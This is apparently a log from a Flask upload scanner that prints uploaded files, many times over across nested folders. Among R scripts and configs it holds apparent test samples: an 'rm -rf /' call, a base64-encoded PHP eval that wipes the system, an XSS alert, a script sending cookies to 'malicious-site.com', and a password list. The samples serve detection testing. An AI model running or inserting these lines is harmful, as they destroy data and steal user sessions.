2025-02-22 20:51:21,262 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,266 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,267 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,268 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,269 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,271 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,272 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,273 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,279 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,280 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,281 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,284 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,285 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,287 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,289 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,290 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,291 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,292 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,293 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,294 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,300 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,301 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,302 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,304 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,306 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,308 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,310 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,311 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,312 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,313 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,314 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,315 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,321 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,322 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,323 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:21,325 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:21,326 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:21,329 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:21,330 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,332 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,333 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,334 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,335 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,336 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:21,341 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,342 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:21,344 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,346 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,347 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,348 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,349 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,352 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,353 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,354 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,355 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,357 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,358 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,359 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,361 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,362 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,364 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,366 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,368 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,369 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,371 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,372 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,378 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,385 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,390 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,391 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,393 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,395 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,397 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,400 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:21,401 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:21,403 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:21,404 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:21,406 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:21,407 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:21,409 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:21,410 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:21,412 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,588 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:27,593 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:27,594 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:27,597 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,599 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,600 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,601 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,602 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,603 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

